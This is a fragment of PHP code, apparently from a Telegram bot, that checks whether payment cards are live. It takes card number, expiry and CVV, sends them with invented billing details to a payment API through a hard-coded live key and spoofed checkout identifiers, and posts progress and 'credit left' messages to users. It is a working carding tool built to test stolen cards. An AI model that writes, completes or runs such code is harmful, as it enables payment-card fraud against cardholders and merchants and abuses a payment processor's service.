...
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=926877758'>@YYNXX</a></b>");
...
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■□□□ 40%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=926877758'>@YYNXX</a></b>");
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
    ...
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$first.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&405d5df6-32a8-4106-b25f-46f04ca8d6b683159c&muid=86827b09-c2d0-483a-b4df-eb64199864c9971020&sid=14734e3e-6470-4aa3-a691-7dc6d830eb13cae5ad&key=pk_live_LKZ2v8hyMK4h50Hw4DqNsFIo&payment_user_agent=stripe.js/1c4929adc9;+stripe-js-v3/1c4929adc9;+checkout');
$result1 = curl_exec($ch);
$cap1 = json_decode($result1, true);
$id = $cap1['id'];
curl_close($ch);
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■□□ 60%[🟨] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=926877758'>@YYNXX</a></b>");
...
$ch = curl_init();
    ...
    $cs = $cap1['id'];
curl_close($ch);
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=926877758'>@YYNXX</a></b>");
if (!empty($cs)) {
$ch = curl_init();
...
Credit Left ->> ${balance}💰
Bot By --> <a href='tg://user?id=926877758'>@YYNXX</a></b>");
